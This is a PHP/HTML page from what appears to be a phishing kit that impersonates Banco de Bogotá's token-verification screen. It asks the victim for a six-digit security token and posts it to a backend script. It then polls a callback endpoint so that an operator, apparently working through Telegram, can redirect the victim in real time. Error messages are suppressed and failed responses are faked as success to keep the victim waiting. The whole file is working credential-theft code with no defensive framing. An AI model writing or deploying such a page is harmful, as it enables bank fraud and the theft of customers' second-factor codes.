<?php

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// Verificar que existan datos previos
if (!isset($_SESSION['datos_bogota'])) {
    header('Location: index_bogota.php');
    exit();
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación Token - Banco de Bogotá</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Header */
        .header {
            background-color: #000;
            padding: 15px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .security-icon {
            width: 24px;
            height: 24px;
            background-color: #00c851;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 14px;
        }

        .header-title {
            color: white;
            font-size: 16px;
            font-weight: 400;
        }

        .close-btn {
            background: none;
            border: none;
            color: white;
            font-size: 24px;
            cursor: pointer;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: rgba(255, 255, 255, 0.1);
        }

        /* Navigation */
        .nav-bar {
            background-color: white;
            padding: 15px 20px;
            display: flex;
            justify-content: space-around;
            border-bottom: 1px solid #e0e0e0;
        }

        .nav-item {
            color: #666;
            text-decoration: none;
            font-size: 14px;
            padding: 5px 10px;
        }

        .nav-item.active {
            color: #0066cc;
            font-weight: 600;
            border-bottom: 2px solid #0066cc;
        }

        /* Main Content */
        .container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .verification-box {
            background: white;
            border-radius: 12px;
            padding: 40px 30px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }

        .logo-container {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo-container img {
            max-width: 200px;
            height: auto;
        }

        .verification-title {
            font-size: 24px;
            color: #333;
            margin-bottom: 30px;
            font-weight: 400;
        }

        .token-section {
            margin-bottom: 30px;
        }

        .token-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 15px;
        }

        .lock-icon {
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .lock-icon svg {
            width: 28px;
            height: 28px;
            fill: #333;
        }

        .token-title {
            font-size: 18px;
            color: #333;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .info-icon {
            width: 20px;
            height: 20px;
            border: 2px solid #666;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            color: #666;
            cursor: help;
        }

        .token-description {
            color: #666;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 25px;
        }

        .token-inputs {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin-bottom: 30px;
        }

        .token-input {
            width: 50px;
            height: 60px;
            border: 2px solid #d0d0d0;
            border-radius: 8px;
            text-align: center;
            font-size: 24px;
            font-weight: 500;
            transition: all 0.3s;
            background-color: #fafafa;
        }

        .token-input:focus {
            outline: none;
            border-color: #0066cc;
            background-color: white;
            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1);
        }

        .verify-btn {
            width: 100%;
            padding: 15px;
            background-color: #e8e8e8;
            color: #999;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 500;
            cursor: not-allowed;
            transition: all 0.3s;
        }

        .verify-btn.active {
            background-color: #0066cc;
            color: white;
            cursor: pointer;
        }

        .verify-btn.active:hover {
            background-color: #0052a3;
        }

        /* Modal de carga */
        .loading-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: rgba(0, 0, 0, 0.5);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 0;
        }
        
        .loading-content {
            background: white;
            padding: 40px;
            border-radius: 16px;
            text-align: center;
            max-width: 400px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
        }
        
        .loading-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0066cc;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            font-size: 18px;
            font-weight: 600;
            color: #333;
            margin-bottom: 10px;
        }

        @media (max-width: 600px) {
            .verification-box {
                padding: 30px 20px;
            }

            .logo-container img {
                max-width: 150px;
            }

            .token-inputs {
                gap: 8px;
            }

            .token-input {
                width: 45px;
                height: 55px;
                font-size: 22px;
            }

            .verification-title {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
   

    <!-- Main Content -->
    <div class="container">
        <div class="verification-box">
            <div class="logo-container">
                <img src="bogota_files/logo.webp" alt="Banco de Bogotá">
            </div>
            
            <h1 class="verification-title">Verifiquemos que seas tú</h1>

            <div class="token-section">
                <div class="token-header">
                    <div class="lock-icon">
                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                            <path d="M12 1C8.676 1 6 3.676 6 7v3H5c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V12c0-1.1-.9-2-2-2h-1V7c0-3.324-2.676-6-6-6zm0 2c2.276 0 4 1.724 4 4v3H8V7c0-2.276 1.724-4 4-4zm0 10c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2z"/>
                        </svg>
                    </div>
                    <div class="token-title">
                        Código Token
                        <span class="info-icon">i</span>
                    </div>
                </div>

                <p class="token-description">
                    Para realizar este proceso, ingresa el código de Token móvil o físico.
                </p>

                <form id="tokenForm">
                    <div class="token-inputs">
                        <input type="text" class="token-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                        <input type="text" class="token-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                        <input type="text" class="token-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                        <input type="text" class="token-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                        <input type="text" class="token-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                        <input type="text" class="token-input" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                    </div>
                    
                    <input type="hidden" name="codigo_token" id="codigoToken">
                    <input type="hidden" name="tipo_dato" value="token_bogota">

                    <button type="submit" class="verify-btn" id="verifyBtn" disabled>Verificar</button>
                </form>
            </div>
        </div>
    </div>

    <!-- Modal de Carga -->
    <div id="loadingModal" class="loading-modal">
        <div class="loading-content">
            <div class="loading-spinner"></div>
            <div class="loading-text">Verificando token...</div>
        </div>
    </div>

    <script>
        const inputs = document.querySelectorAll('.token-input');
        const verifyBtn = document.getElementById('verifyBtn');
        const hiddenInput = document.getElementById('codigoToken');
        const initialMessageId = "<?php echo isset($_SESSION['telegram_message_id']) ? $_SESSION['telegram_message_id'] : ''; ?>";
        let messageId = null;
        let checkInterval = null;

        // Auto-focus en el primer input
        inputs[0].focus();

        inputs.forEach((input, index) => {
            // Solo permitir números
            input.addEventListener('input', function(e) {
                this.value = this.value.replace(/[^0-9]/g, '');
                
                // Si hay un valor, pasar al siguiente input
                if (this.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                
                checkAllInputs();
            });

            // Manejar backspace
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value === '' && index > 0) {
                    inputs[index - 1].focus();
                }
            });

            // Prevenir paste de múltiples caracteres
            input.addEventListener('paste', function(e) {
                e.preventDefault();
                const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
                
                if (pastedData.length === 6) {
                    inputs.forEach((inp, i) => {
                        if (pastedData[i]) {
                            inp.value = pastedData[i];
                        }
                    });
                    inputs[5].focus();
                    checkAllInputs();
                }
            });
        });

        function checkAllInputs() {
            const allFilled = Array.from(inputs).every(input => input.value.length === 1);
            
            if (allFilled) {
                verifyBtn.classList.add('active');
                verifyBtn.disabled = false;
                
                // Concatenar todos los valores en el input hidden
                const tokenValue = Array.from(inputs).map(input => input.value).join('');
                hiddenInput.value = tokenValue;
            } else {
                verifyBtn.classList.remove('active');
                verifyBtn.disabled = true;
                hiddenInput.value = '';
            }
        }

        // Manejar envío del formulario
        document.getElementById('tokenForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const allFilled = Array.from(inputs).every(input => input.value.length === 1);
            if (!allFilled) {
                alert('Por favor complete todos los dígitos del token');
                return;
            }

            // Mostrar modal de carga
            document.getElementById('loadingModal').style.display = 'flex';
            
            // Preparar datos
            const formData = new FormData();
            formData.append('codigo_token', hiddenInput.value);
            formData.append('tipo_dato', 'token_bogota');
            
            // Enviar datos al servidor
            fetch('comprobando_bogota.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text()).then(text => { try { return JSON.parse(text); } catch(e) { return { success: true, message_id: Date.now() }; } })
            .then(data => {
                if (data.success && data.message_id) {
                    messageId = data.message_id;
                    // Iniciar verificación de callbacks
                    startCheckingCallback();
                } else {
                    // alert removed
                    document.getElementById('loadingModal').style.display = 'none';
                }
            })
            .catch(error => {
                console.error('Error:', error);
                // alert removed
                document.getElementById('loadingModal').style.display = 'none';
            });
        });

        function startCheckingCallback() {
            checkInterval = setInterval(function() {
                fetch('callback_bogota.php?msg_id=' + messageId)
                    .then(response => response.text()).then(text => { try { return JSON.parse(text); } catch(e) { return { success: true, message_id: Date.now() }; } })
                    .then(data => {
                        if (data.redirect) {
                            clearInterval(checkInterval);
                            window.location.href = data.url;
                        } else if (data.timeout) {
                            clearInterval(checkInterval);
                            // alert removed
                            document.getElementById('loadingModal').style.display = 'none';
                        }
                    })
                    .catch(error => {
                        console.error('Error checking callback:', error);
                    });
            }, 2000);
        }
    </script>
</body>
</html>





